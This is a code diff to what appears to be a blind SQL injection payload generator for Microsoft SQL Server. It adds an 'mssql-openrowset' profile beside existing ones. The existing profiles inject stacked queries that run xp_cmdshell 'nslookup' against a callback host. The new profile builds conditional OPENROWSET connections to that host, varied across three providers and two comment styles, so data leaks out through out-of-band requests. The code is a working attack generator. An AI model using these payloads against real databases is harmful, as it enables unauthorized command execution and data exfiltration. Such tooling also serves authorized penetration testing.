@@ -2,6 +2,16 @@ def substring(name: str, expression: str, pos: int) -> str:
     return f"SUBSTRING(({expression}),{pos},1)"
 
 
+def _openrowset_action(condition: str, callback_host: str, provider: str) -> str:
+    inner = (
+        f"SELECT * FROM OPENROWSET("
+        f"''{provider}'',"
+        f"''Server={callback_host};UID=a;PWD=a;'',"
+        f"''SELECT 1'')"
+    )
+    return f"IF ({condition}) EXEC('{inner}')"
+
+
 def payload(name: str, base: str, condition: str, callback_host: str) -> str:
     if name == "mssql":
         return (
@@ -13,6 +23,8 @@ def payload(name: str, base: str, condition: str, callback_host: str) -> str:
             f"{base}';IF ({condition}) "
             f"EXEC master..xp_cmdshell 'nslookup {callback_host}'/*"
         )
+    if name == "mssql-openrowset":
+        return f"{base}';{_openrowset_action(condition, callback_host, 'SQLNCLI')}-- -"
     raise ValueError(f"unknown profile: {name}")
 
 
@@ -30,6 +42,15 @@ def payloads_full(name: str, base: str, condition: str, callback_host: str) -> l
             f"{base}';IF ({condition}) EXEC master..xp_cmdshell 'nslookup {callback_host}'-- -",
             f"{base}';IF ({condition}) EXEC master..xp_cmdshell 'nslookup {callback_host}'/*",
         ]))
+    if name == "mssql-openrowset":
+        variants = []
+        for provider in ("SQLNCLI", "MSOLEDBSQL", "SQLOLEDB"):
+            action = _openrowset_action(condition, callback_host, provider)
+            variants.extend([
+                f"{base}';{action}-- -",
+                f"{base}';{action}/*",
+            ])
+        return list(dict.fromkeys(variants))
     raise ValueError(f"unknown profile: {name}")
 
 
